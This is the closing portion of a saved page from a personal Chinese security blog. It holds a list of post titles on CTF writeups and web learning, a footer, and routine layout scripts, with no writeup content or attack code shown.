href="/2015/10/04/XDCTF2015-writeup/">XDCTF2015-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/09/28/nsctf-writeup/">Nsctf2015_Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/07/02/xss-p/">xss无声挑战赛_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/06/11/ctf0611/">ctf近期总结</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/22/Hexo-blogs/">Windows Hexo博客安装配置优化（小白篇）</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/21/fucksql/">Hduisa_ctf_wee4_fucksql</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/05/10/webforpentester/">Web for pentester_writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup2/">Hduisa_ctf_writeup02</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/hduisa-ctf-writeup1/">Hduisa_ctf_writeup01</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/02/26/shinian/">（转）十年学会程序设计</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/01/22/webfirst/">0基础如何学好WEB（转）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/31/hackx/">凤凰挽歌，黑客独白（作者：我是老鹰&amp;炫凤舞）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/bookshelf1/">（转）学长们给我们的书目（结尾附上PDF地址）</a></li><li class="post-list-item"><a class="post-list-link" href="/2014/12/29/xiaobaistart/">菜鸟小白的开始...</a></li></ul>
<script>
</script>

<footer id="footer">
<div class="outer">
<div id="footer-info">
<div class="footer-left">
<i class="fa fa-copyright"></i> 
                2014-2017 LoRexxar
            </div>
<div class="footer-right">
<a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
</div>
</div>
<div class="visit">
<span id="busuanzi_container_site_pv" style="display:none">
<span id="site-visit" title="本站到访数"><i aria-hidden="true" class="fa fa-user"></i><span id="busuanzi_value_site_uv"></span>
</span>
</span>
<span>| </span>
<span id="busuanzi_container_page_pv" style="display:none">
<span id="page-visit" title="本页阅读量"><i aria-hidden="true" class="fa fa-eye animated infinite pulse"></i><span id="busuanzi_value_page_pv"></span>
</span>
</span>
</div>
</div>
</footer>

<script data-main="/js/main.js" src="./web_for_pentest_II writeup  LoRexxar's Blog/require.min.js"></script>
<script>
        $(document).ready(function() {
            var iPad = window.navigator.userAgent.indexOf('iPad');
            if (iPad > -1 || $(".left-col").css("display") === "none") {
                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
            }
            else {
                var backgroundnum = 7;
                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
            }
        })
    </script>
<div class="scroll" id="scroll">
<a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
<a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
<a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
</div>
<script>
    // Open in New Window
    
        var oOpenInNew = {
            
            
            
            
            
            
             archives: ".archive-article-title", 
             miniArchives: "a.post-list-link", 
            
             friends: "#js-friends a", 
             socail: ".social a" 
        }
        for (var x in oOpenInNew) {
            $(oOpenInNew[x]).attr("target", "_blank");
        }
    
</script>
<script async="" src="./web_for_pentest_II writeup  LoRexxar's Blog/busuanzi.pure.mini.js">
</script>


